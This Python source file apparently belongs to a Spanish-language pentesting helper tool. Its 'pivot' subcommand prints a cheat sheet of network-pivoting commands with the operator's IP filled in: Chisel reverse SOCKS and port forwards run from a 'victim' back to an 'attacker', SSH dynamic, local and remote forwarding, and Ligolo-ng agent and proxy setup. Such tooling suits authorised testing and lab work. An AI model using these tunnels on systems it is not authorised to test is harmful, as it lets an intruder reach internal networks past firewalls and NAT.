"""Chuleta de túneles: Chisel, SSH -D/-L/-R y Ligolo-ng con tu IP rellenada."""

import argparse

from tarascan import ui
from tarascan.commands.transfer import detect_lhost


def cmd_pivot(argv: list[str]) -> int:
    p = argparse.ArgumentParser(prog="tarascan pivot", description="chuleta de túneles (Chisel, SSH, Ligolo-ng)")
    p.add_argument("-l", "--lhost", help="tu IP (por defecto autodetectada de tun0)")
    p.add_argument("-p", "--port", type=int, default=8080, help="puerto del servidor de túnel (por defecto 8080)")
    args = p.parse_args(argv)

    lhost = args.lhost or detect_lhost()
    port = args.port
    ui.rule(f"pivoting · [{ui.PURPLE}]{lhost}[/]")

    chisel = ui.table("Dónde", "Comando")
    chisel.add_row(ui.Text("Atacante", style=ui.PURPLE), f"chisel server -p {port} --reverse")
    chisel.add_row(ui.Text("Víctima (SOCKS)", style=ui.PURPLE), f"chisel client {lhost}:{port} R:socks")
    chisel.add_row(ui.Text("Víctima (port fwd)", style=ui.PURPLE), f"chisel client {lhost}:{port} R:3389:127.0.0.1:3389")
    ui.panel("Chisel", "túnel inverso: el agente sale hacia ti (atraviesa NAT/firewall)", [
        chisel,
        ui.note("con R:socks añade 'socks5 127.0.0.1 1080' a /etc/proxychains4.conf y usa proxychains."),
    ])

    ssh = ui.table("Tipo", "Comando", "Para qué")
    ssh.add_row(ui.Text("Dinámico -D", style=ui.PURPLE), f"ssh -D 1080 -N user@PIVOT", "SOCKS por toda la red interna")
    ssh.add_row(ui.Text("Local -L", style=ui.PURPLE), f"ssh -L 8000:127.0.0.1:80 -N user@PIVOT", "traer un puerto del pivote a ti")
    ssh.add_row(ui.Text("Remoto -R", style=ui.PURPLE), f"ssh -R {port}:127.0.0.1:{port} -N user@ATACANTE", "exponer tu puerto en el pivote")
    ui.panel("SSH forwarding", "si tienes credenciales SSH en el pivote", [ssh])

    lig = ui.table("Dónde", "Comando")
    lig.add_row(ui.Text("Atacante (1)", style=ui.PURPLE), "sudo ip tuntap add user $USER mode tun ligolo; sudo ip link set ligolo up")
    lig.add_row(ui.Text("Atacante (2)", style=ui.PURPLE), f"./proxy -selfcert -laddr 0.0.0.0:{port}")
    lig.add_row(ui.Text("Víctima", style=ui.PURPLE), f"./agent -connect {lhost}:{port} -ignore-cert")
    lig.add_row(ui.Text("En el proxy", style=ui.PURPLE), "session; luego 'start'; añade rutas con 'ip route add SUBRED/24 dev ligolo'")
    ui.panel("Ligolo-ng", "túnel por interfaz TUN: la red interna aparece como rutas locales", [lig])
    return 0
